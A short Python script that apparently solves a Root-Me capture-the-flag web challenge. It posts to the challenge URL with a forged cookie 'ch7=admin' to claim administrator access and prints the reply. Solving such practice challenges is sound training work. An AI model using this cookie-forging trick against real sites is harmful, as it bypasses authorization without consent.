import requests

url = 'http://challenge01.root-me.org/web-serveur/ch7/'

cookies = {'ch7': 'admin'} 

r = requests.post(url, cookies=cookies)

print(r.text)